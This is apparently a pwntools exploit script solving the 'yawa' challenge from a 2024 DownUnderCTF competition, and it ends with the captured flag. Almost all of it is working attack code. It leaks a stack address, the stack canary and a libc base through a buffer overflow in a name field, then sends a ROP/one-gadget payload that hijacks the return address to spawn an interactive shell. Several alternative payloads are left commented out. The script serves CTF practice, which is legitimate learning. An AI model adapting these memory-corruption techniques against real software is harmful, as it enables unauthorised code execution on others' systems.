#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
context.log_level = logging.DEBUG
context.terminal = ["zellij", "action", "new-pane", "-d", "right", "-c", "--", "bash", "-c"]
exe = './yawa_patched'

host = args.HOST or '2024.ductf.dev'
port = int(args.PORT or 30010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
brva 0x133f
# brva 0x12fa
continue
'''.format(**locals())

def name(name: bytes):
    io.sendlineafter('> ', '1')
    io.sendline(name)

def greeting():
    io.sendlineafter('> ', '2')
    return io.recvuntil(b'1.')

io = start()

off = 0x18
name(b'A'*off)
stack_leak = u64(greeting()[off+0x7:off+0x7+6].ljust(8, p8(0)))
info(hex(stack_leak))

name(b'A'*0x58)
canary = u64(greeting()[0x60:0x67].rjust(8, p8(0)))
info(hex(canary))

name(b'A'*0x68)
leak = u64(greeting()[0x6f:0x6f+6].ljust(8, p8(0)))
info(hex(leak))
libc = ELF('./libc.so.6')
libc.address = leak - 0x29d0a
info(hex(libc.address))

# p = fit({
#     0x58: p64(canary),
#     0x60: p64(stack_leak),
#     0x68: p64(libc.address + 0x1bbea1), # pop rdi            
#     0x68+8: p64(libc.address + (0x7f9271dd8678-0x7f9271c00000)), # sh
#     0x68+0x10: p64(libc.sym['system'])
# })

# working
p = fit({
    0x58: p64(canary),
    0x60: p64(libc.address+0x21a000+0x1000),
    0x68: p64(libc.address + 0x1bb197),
    0x70: p64(0),
    0x78: p64(libc.address + 0xebc88)
})

# p = fit({
#     0x58: p64(canary),
#     0x68: p64(libc.address + 0x128340),       
#     0x70: p64(0x3b),
#     0x78: p64(libc.address + 0x1bbea1),
#     0x80: p64(libc.address + (0x7f9271dd8678-0x7f9271c00000)),
#     0x88: p64(libc.address + 0x177cf1),
# })

# p = fit({
#     0x58: p64(canary),
#     0x68: p64(libc.address + 0x719aa),       
#     0x70: p64(0x3b),
#     0x78: p64(libc.address + 0x1bbea1),
#     0x80: p64(libc.address + (0x7f9271dd8678-0x7f9271c00000)),
#     # 0x88: p64(libc.address + 0x177cf1),
# })


name(p)

io.sendlineafter(b'> ', '3')

io.interactive()

# DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}
